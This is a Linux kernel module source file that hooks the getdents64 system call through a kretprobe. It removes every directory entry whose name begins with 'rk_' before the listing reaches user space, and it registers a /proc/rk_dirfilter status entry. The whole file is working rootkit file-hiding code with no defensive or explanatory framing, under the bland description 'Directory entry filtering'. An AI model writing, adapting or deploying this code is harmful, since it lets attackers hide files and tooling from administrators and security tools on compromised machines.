// SPDX-License-Identifier: GPL-2.0
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#define HIDDEN_PREFIX "rk_"

static struct proc_dir_entry *proc_entry;

struct getdents_ctx {
	struct linux_dirent64 __user *dirent;
};

static int entry_getdents64(struct kretprobe_instance *ri,
			    struct pt_regs *regs)
{
	struct getdents_ctx *ctx = (void *)ri->data;
	struct pt_regs *uregs = (struct pt_regs *)regs->di;

	ctx->dirent = (struct linux_dirent64 __user *)uregs->si;
	return 0;
}

static int ret_getdents64(struct kretprobe_instance *ri,
			  struct pt_regs *regs)
{
	struct getdents_ctx *ctx = (void *)ri->data;
	long ret = regs_return_value(regs);
	struct linux_dirent64 *cur;
	char *buf;
	long off;

	if (ret <= 0)
		return 0;

	buf = kvmalloc(ret, GFP_KERNEL);
	if (!buf)
		return 0;

	if (copy_from_user(buf, ctx->dirent, ret)) {
		kvfree(buf);
		return 0;
	}

	off = 0;
	while (off < ret) {
		cur = (struct linux_dirent64 *)(buf + off);
		if (strncmp(cur->d_name, HIDDEN_PREFIX,
			    sizeof(HIDDEN_PREFIX) - 1) == 0) {
			long rest = ret - off - cur->d_reclen;

			if (rest > 0)
				memmove(buf + off,
					buf + off + cur->d_reclen, rest);
			ret -= cur->d_reclen;
			continue;
		}
		off += cur->d_reclen;
	}

	copy_to_user(ctx->dirent, buf, ret);
	regs_set_return_value(regs, ret);
	kvfree(buf);
	return 0;
}

static struct kretprobe krp = {
	.kp.symbol_name	= "__x64_sys_getdents64",
	.entry_handler	= entry_getdents64,
	.handler	= ret_getdents64,
	.data_size	= sizeof(struct getdents_ctx),
	.maxactive	= 20,
};

static int status_show(struct seq_file *m, void *v)
{
	seq_puts(m, "hidden\n");
	return 0;
}

static int __init dirfilter_init(void)
{
	int err;

	err = register_kretprobe(&krp);
	if (err)
		return err;

	proc_entry = proc_create_single("rk_dirfilter", 0444, NULL,
					status_show);
	if (!proc_entry) {
		unregister_kretprobe(&krp);
		return -ENOMEM;
	}

	pr_info("rk: getdents64 hook installed\n");
	return 0;
}

static void __exit dirfilter_exit(void)
{
	proc_remove(proc_entry);
	unregister_kretprobe(&krp);
}

module_init(dirfilter_init);
module_exit(dirfilter_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Directory entry filtering via getdents64");
